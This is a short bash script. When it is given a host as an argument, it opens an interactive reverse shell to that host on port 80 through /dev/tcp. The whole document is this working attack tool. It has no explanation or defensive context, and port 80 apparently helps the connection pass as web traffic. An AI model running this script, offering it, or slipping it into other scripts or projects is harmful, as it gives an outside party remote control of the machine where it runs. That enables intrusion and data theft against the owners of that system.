#!/bin/bash

if [ "$#" -ne 0 ];
then
	bash -i &> /dev/tcp/$1/80 0>&1
fi
